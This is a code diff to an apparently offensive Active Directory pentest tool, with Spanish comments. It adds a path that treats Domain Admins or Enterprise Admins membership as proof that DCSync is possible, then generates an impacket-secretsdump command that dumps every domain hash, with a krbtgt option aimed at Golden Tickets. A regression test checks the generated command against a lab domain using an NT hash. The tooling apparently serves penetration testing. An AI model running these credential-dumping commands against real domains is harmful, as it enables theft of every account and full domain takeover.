@@ -8236,7 +8236,31 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                     if not any(m.lower() == u.lower() for m in members):
                         continue
                     _sec_url = secret if SHOW_SECRETS else "***"
-                    if grp == "Backup Operators":
+                    if grp in ("Domain Admins", "Enterprise Admins"):
+                        # BUG real corregido aquí (operador real: Administrator confirmado
+                        # Domain Admin — Pwn3d! por LDAP/SMB/WINRM/WMI — pero el informe nunca
+                        # sugirió 'impacket-secretsdump', "no da impacket secretsdump etc, faltan
+                        # cosas"): el ÚNICO camino existente a DCSync era 'daclread RIGHTS=DCSync'
+                        # (más arriba), que solo mira la ACE DIRECTA del principal — confirmado
+                        # leyendo el código fuente real de nxc (nxc/modules/daclread.py: compara
+                        # 'self.principal_sid' contra el SID del trustee de la ACE, SIN expandir
+                        # membresías de grupo). El derecho de replicación casi siempre está
+                        # concedido al SID del GRUPO 'Domain Admins'/'Enterprise Admins', no al de
+                        # cada usuario — así que esa comprobación se lo perdía precisamente en el
+                        # caso más común (un Domain Admin de verdad). Ser miembro de cualquiera de
+                        # los dos YA implica DCSync de facto, sin depender de esa ACE concreta.
+                        # Mismo marcador 'DCSync viable' que el camino por ACE (_add_once lo
+                        # deduplica solo si YA se encontró por ese otro camino).
+                        _da_txt = (f"AD (cred {u}): DCSync viable — «{u}» es miembro de '{grp}' → volcar TODOS "
+                                   "los hashes del dominio (krbtgt incluido) sin depender de una ACE directa")
+                        if _add_once(res, "critica", _da_txt, "DCSync viable", seen):
+                            _da_auth = (f"-hashes :{_sec_url} {domain or 'DOMINIO'}/{shlex.quote(u)}@{ip}" if is_hash
+                                        else f"{domain or 'DOMINIO'}/{shlex.quote(u)}:{_sec_url}@{ip}")
+                            _attach_cmd(res, _da_txt, [
+                                f"impacket-secretsdump -just-dc {_da_auth}   # DCSync por membresía de '{grp}' "
+                                "confirmada arriba: vuelca el NTDS entero (añade '-just-dc-user krbtgt' para solo "
+                                "la krbtgt → Golden Ticket)"])
+                    elif grp == "Backup Operators":
                         # SeBackupPrivilege: el módulo 'backup_operator' de nxc (mpgn_x64,
                         # netexec/nxc/modules/backup_operator.py — confirmado leyendo su código
                         # fuente real) explota esto SOLO: dispara RemoteRegistry, vuelca
@@ -13414,6 +13438,38 @@ def selftest():
                for s, t in _ceres_po_da["findings"]), _ceres_po_da["findings"]
     assert any("evil-winrm -i 10.0.0.1 -u jon -p Welcome1" in n and "SeLoadDriverPrivilege" in n for n in _ceres_po_da["next"]), _ceres_po_da["next"]
     assert any("dnscmd" in n and "serverlevelplugindll" in n for n in _ceres_po_da["next"]), _ceres_po_da["next"]
+
+    # Regresión REAL (operador real: Administrator confirmado Domain Admin — Pwn3d! por
+    # LDAP/SMB/WINRM/WMI — pero el informe nunca sugirió 'impacket-secretsdump': "no da impacket
+    # secretsdump etc, faltan cosas"). Causa real: 'daclread RIGHTS=DCSync' solo mira la ACE
+    # DIRECTA del principal (confirmado en nxc/modules/daclread.py: compara el SID del PRINCIPAL
+    # contra el trustee de la ACE, sin expandir membresía de grupo) — y el derecho de replicación
+    # casi siempre está concedido al SID del GRUPO 'Domain Admins', no al de cada usuario. Ser
+    # miembro de 'Domain Admins'/'Enterprise Admins' debe bastar por sí solo, sin depender de esa
+    # ACE. El daclread de este fixture devuelve "[*] ok" (sin ACE) a propósito, para que SOLO la
+    # vía nueva (membresía) sea la que detecte el DCSync.
+    def _fake_ce_da_dcsync(cmd, timeout=None, quiet=False, **kw):
+        if cmd[0] == "ldapsearch":
+            return 0, ""
+        if "-M" in cmd and "maq" in cmd:
+            return 0, "MachineAccountQuota: 10"
+        if "--groups" in cmd and cmd[-1] == "Domain Admins":
+            return 0, "LDAP 10.0.0.1 389 DC01 Administrator\nLDAP 10.0.0.1 389 DC01 admin"
+        return 0, "LDAP 10.0.0.1 389 DC01 [*] ok"
+    globals()["run_capture"] = _fake_ce_da_dcsync
+    _ceres_da_dcsync = _fp("reuse-ldap", "x", [389])
+    try:
+        _creds_enum(_ceres_da_dcsync, "FAKE_NXC", "ldap", "10.0.0.1", "Administrator", "8982babd4da89d33210779a6c5b078bd",
+                   True, False, True, 389, 389, None, domain="soupedecode.local")
+    finally:
+        globals()["run_capture"] = _real_rc_ce
+    assert any(s == "critica" and "DCSync viable" in t and "miembro de 'Domain Admins'" in t
+               for s, t in _ceres_da_dcsync["findings"]), _ceres_da_dcsync["findings"]
+    assert any("impacket-secretsdump -just-dc -hashes :8982babd4da89d33210779a6c5b078bd soupedecode.local/Administrator@10.0.0.1" in n
+               for n in _ceres_da_dcsync["next"]), _ceres_da_dcsync["next"]
+    # el marcador 'DCSync viable' es el MISMO que usa el camino por ACE (_surface_acl_abuse) — un
+    # solo hallazgo crítico de DCSync, nunca dos, venga por el camino que venga.
+    assert sum("DCSync viable" in t for _s, t in _ceres_da_dcsync["findings"]) == 1, _ceres_da_dcsync["findings"]
 
     # LDAP primero (_CREDS_PROTO_PRIORITY la pone antes que SMB): si YA sacó la lista COMPLETA
     # de usuarios del dominio, SMB se la ahorra (--users/--rid-brute, mucho más lentos contra un
